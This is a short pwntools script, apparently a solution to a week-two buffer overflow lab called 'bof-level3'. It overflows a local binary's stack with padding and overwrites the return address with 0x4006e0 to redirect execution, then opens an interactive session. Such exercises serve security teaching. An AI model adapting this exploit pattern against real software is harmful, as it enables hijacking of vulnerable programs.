# week2-bof-level3
#!/usr/bin/env python

from pwn import *

p = process('./bof-level3')

buffer = "A" * 32
buffer += "ABCDEFGH"
buffer += "abcdefgh"
buffer += "AAAAAAAA"

buffer += p64(0x4006e0);

p.sendline(buffer)

p.interactive()